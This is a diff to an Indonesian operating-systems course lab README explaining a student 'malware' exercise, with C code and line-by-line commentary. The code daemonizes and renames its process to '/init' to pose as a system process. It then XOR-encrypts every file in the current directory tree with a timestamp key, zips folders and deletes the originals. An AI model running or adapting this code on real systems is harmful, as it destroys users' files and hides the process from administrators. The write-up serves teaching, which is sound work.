@@ -343,6 +343,201 @@ E. "Password Check" → Karena kamu sudah mendapatkan password tersebut, kamu me
 ## Soal 2
 
 ## Soal 3
+[Author: Afnaan / honque]
+
+Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee. Share ke teman teman kalian yang tidak mengerjakan soal ini
+
+![image](https://github.com/user-attachments/assets/a5aa5a54-1cca-42a2-930a-9e7cc9966b19)
+
+A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.
+
+```bash
+    if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+```
+- `if (argc > 0 && strcmp(argv[0], "init") == 0)`: Mengecek apakah argumen pertama (argv[0], yaitu nama program) adalah "init"—artinya program dipanggil dengan nama penyamaran /init.
+- `daemonize();`: Mengubah proses menjadi daemon (background process) agar berjalan terus-menerus di latar belakang, tanpa terminal.
+- `chdir(cwd);`: Berpindah ke direktori kerja (cwd) yang sebelumnya sudah ditentukan agar daemon tahu lokasi kerjanya.
+- `prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`: Mengatur nama proses di sistem menjadi "/init" untuk menyamarkan diri seolah proses sistem utama.
+
+B. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.
+
+```bash
+void encrypt_all_files(const char *dirpath, const char *self_exe) {
+    DIR *dir = opendir(dirpath);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);
+
+        struct stat st;
+        if (stat(fullpath, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            encrypt_all_files(fullpath, self_exe);
+        } else if (S_ISREG(st.st_mode)) {
+            if (strcmp(fullpath, self_exe) != 0) {
+                printf("Enkripsi: %s\n", fullpath);
+                simple_xor_encrypt(fullpath);
+            }
+        }
+    }
+
+    closedir(dir);
+}
+```
+- `void encrypt_all_files(const char *dirpath, const char *self_exe) { ... }`: Fungsi untuk melakukan enkripsi seluruh file reguler dalam sebuah direktori (termasuk subdirektorinya), kecuali file executable dirinya sendiri.
+- `DIR *dir = opendir(dirpath); if (!dir) return;`: Membuka direktori dirpath, jika gagal langsung keluar.
+- `struct dirent *entry; char fullpath[1024];`: Menyimpan entri direktori dan path lengkap dari file yang akan diproses.
+- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop setiap isi direktori,serta abaikan `.` dan `..`.
+- `snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, entry->d_name);`: Gabungkan path direktori dan nama file jadi path lengkap.
+- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Dapatkan informasi file, skip jika gagal.
+- `if (S_ISDIR(st.st_mode)) { encrypt_all_files(fullpath, self_exe); }`: Jika file adalah direktori, rekursif panggil `encrypt_all_files`.
+- `else if (S_ISREG(st.st_mode)) { if (strcmp(fullpath, self_exe) != 0) { printf("Enkripsi: %s\n", fullpath); simple_xor_encrypt(fullpath); } }`: Jika file reguler dan bukan file dirinya sendiri (`self_exe`), cetak info dan enkripsi file dengan fungsi `simple_xor_encrypt`.
+- `closedir(dir);`: Tutup direktori setelah selesai.
+
+```bash
+void delete_directory(const char *path) {
+    DIR *dir = opendir(path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[1024];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+
+        struct stat st;
+        if (stat(fullpath, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            delete_directory(fullpath);
+        } else {
+            unlink(fullpath);
+        }
+    }
+
+    closedir(dir);
+    rmdir(path);
+}
+```
+- `void delete_directory(const char *path) {`: Fungsi untuk menghapus seluruh isi folder (termasuk subfolder) dan folder itu sendiri.
+- `DIR *dir = opendir(path); if (!dir) return;`: Buka direktori path, jika gagal (misal tidak ada), keluar dari fungsi.
+- `struct dirent *entry; char fullpath[1024];`: entry untuk membaca isi direktori. fullpath untuk menyimpan path lengkap dari file/subfolder.
+- `while ((entry = readdir(dir)) != NULL) { if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;`: Loop tiap entri, abaikan entri `.` dan `..`.
+- `snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);`: Buat path lengkap dari file/folder saat ini.
+- `struct stat st; if (stat(fullpath, &st) == -1) continue;`: Ambil informasi file/folder tersebut, skip jika gagal.
+- `if (S_ISDIR(st.st_mode)) { delete_directory(fullpath); } else { unlink(fullpath); }`: Jika fullpath adalah folder → panggil `delete_directory` secara rekursif, sedangkan jika file biasa → hapus dengan `unlink`.
+- `closedir(dir); rmdir(path);`: Setelah semua isi direktori dihapus, tutup dan hapus direktori itu sendiri.
+
+```bash
+void simple_xor_encrypt(const char *filename) {
+    FILE *f = fopen(filename, "rb+");
+    if (!f) {
+        perror("Gagal buka file untuk enkripsi");
+        return;
+    }
+
+    time_t timestamp = time(NULL);
+    unsigned char key[8];
+    for (int i = 0; i < 8; i++) {
+        key[i] = (timestamp >> (i * 8)) & 0xFF;
+    }
+
+    int c;
+    size_t i = 0;
+    while ((c = fgetc(f)) != EOF) {
+        fseek(f, -1, SEEK_CUR);
+        fputc(c ^ key[i % 8], f);
+        i++;
+    }
+
+    fclose(f);
+}
+```
+- `void simple_xor_encrypt(const char *filename) {`: Fungsi untuk melakukan enkripsi XOR sederhana terhadap isi file yang diberikan.
+- `FILE *f = fopen(filename, "rb+"); if (!f) { perror("Gagal buka file untuk enkripsi"); return; }`: Buka file dalam mode baca-tulis biner (rb+), supaya bisa baca dan langsung menulis kembali hasil enkripsinya ke tempat yang sama, sedangkan jika gagal, tampilkan error dan keluar dari fungsi.
+- `time_t timestamp = time(NULL);`: Ambil timestamp saat ini untuk menjadi dasar dalam membuat key enkripsi.
+- `unsigned char key[8]; for (int i = 0; i < 8; i++) { key[i] = (timestamp >> (i * 8)) & 0xFF; }`: Buat key XOR 8-byte dari timestamp, dipecah byte per byte (little endian style).
+- `int c; size_t i = 0; while ((c = fgetc(f)) != EOF) { fseek(f, -1, SEEK_CUR); fputc(c ^ key[i % 8], f); i++; }`: Loop baca byte demi byte. Setelah membaca byte, `fseek` mundur 1 langkah ke belakang (karena kita ingin menulis di tempat yang sama). Lalu byte tersebut diXOR dengan key, lalu tulis hasilnya. `i % 8` disini untuk memutar penggunaan 8-byte key secara siklik.
+- `fclose(f);`: tutup file setelah enkripsi setelah selesai.
+
+```bash
+void zip_and_encrypt() {
+    DIR *dir = opendir(".");
+    if (!dir) {
+        perror("Gagal buka direktori");
+        return;
+    }
+
+    struct dirent *entry;
+    char exe_path[1024];
+    readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    exe_path[sizeof(exe_path) - 1] = '\0';
+
+    pid_t zip_pids[1024];
+    char folders_to_delete[1024][256];
+    int pid_index = 0;
+    int folder_index = 0;
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        struct stat st;
+        if (stat(entry->d_name, &st) == -1)
+            continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            char zipname[1024];
+            snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);
+
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *argv[] = {"zip", "-r", zipname, entry->d_name, NULL};
+                execvp("zip", argv);
+                perror("execvp zip gagal");
+                exit(1);
+            } else if (pid > 0) {
+                zip_pids[pid_index++] = pid;
+                strncpy(folders_to_delete[folder_index++], entry->d_name, sizeof(folders_to_delete[0]));
+            }
+        }
+    }
+    closedir(dir);
+
+    for (int i = 0; i < pid_index; i++) {
+        int status;
+        waitpid(zip_pids[i], &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+            fprintf(stderr, "Zip gagal untuk folder indeks %d\n", i);
+        }
+    }
+
+    encrypt_all_files(".", exe_path);
+    printf("Enkripsi selesai.\n");
+
+    for (int i = 0; i < folder_index; i++) {
+        delete_directory(folders_to_delete[i]);
+        printf("Folder %s dihapus.\n", folders_to_delete[i]);
+    }
+}
+```
+- `DIR *dir = opendir(".");`: Buka direktori saat ini (.) untuk membaca semua file dan folder di dalamnya.
+- `if (!dir) { perror("Gagal buka direktori"); return; }`: Jika gagal membuka direktori, tampilkan pesan error ke stderr dan hentikan fungsi.
+- `readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); exe_path[sizeof(exe_path) - 1] = '\0';`: Ambil path lengkap dari executable saat ini, lalu akhiri string dengan null terminator agar valid sebagai string.
+- `pid_t zip_pids[1024]; char folders_to_delete[1024][256]; int pid_index = 0; int folder_index = 0;`: Array untuk menyimpan PID dari proses zip, nama folder yang nanti akan dihapus, dan indeksnya masing-masing.
 
 ## Soal 4
 
